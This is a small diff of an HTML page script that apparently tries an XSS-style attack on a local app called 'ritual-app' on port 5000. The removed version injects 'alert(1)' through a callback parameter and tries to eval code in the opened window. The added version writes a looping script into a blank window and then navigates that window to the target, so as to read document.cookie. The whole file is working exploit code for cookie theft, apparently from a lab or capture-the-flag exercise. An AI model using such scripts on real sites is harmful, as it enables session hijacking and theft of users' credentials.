@@ -1,12 +1,15 @@
-<!DOCTYPE html>
 <script>
-let w = open("http://ritual-app:5000/?callback=alert(1)");
+let w = open("about:blank");
 
-setTimeout(() => {
-  try {
-    w.eval("console.log(document.cookie)");
-  } catch(e) {}
-}, 0);
+w.document.write(`
+<script>
+setInterval(()=>{
+  try{
+    console.log(document.cookie)
+  }catch(e){}
+},1)
+<\/script>
+`);
 
-console.log("TEST");
+w.location = "http://ritual-app:5000/";
 </script>
